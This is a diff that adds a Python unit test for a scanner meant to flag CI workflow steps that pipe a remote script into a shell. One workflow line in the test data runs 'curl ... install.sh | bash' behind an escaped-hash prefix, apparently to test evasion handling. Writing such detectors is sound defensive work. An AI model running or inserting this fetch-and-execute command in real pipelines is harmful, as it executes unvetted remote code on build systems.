@@ -902,6 +902,25 @@ class RemoteShellBootstrapTests(unittest.TestCase):
 
         self.assertEqual(violations, [])
 
+    def test_rejects_remote_pipe_after_escaped_hash_literal(self):
+        with tempfile.TemporaryDirectory() as td:
+            repo_root = Path(td)
+            workflow = self.write_workflow(
+                repo_root,
+                "bad.yml",
+                (
+                    "jobs:\n"
+                    "  install:\n"
+                    "    steps:\n"
+                    "      - run: echo \\#ok && curl -fsSL https://example.com/install.sh | bash\n"
+                ),
+            )
+
+            violations = m.find_violations(workflow)
+
+        self.assertEqual(len(violations), 1)
+        self.assertIn("remote shell pipe", violations[0])
+
     def test_ignores_pipe_to_command_dash_v_probe(self):
         with tempfile.TemporaryDirectory() as td:
             repo_root = Path(td)
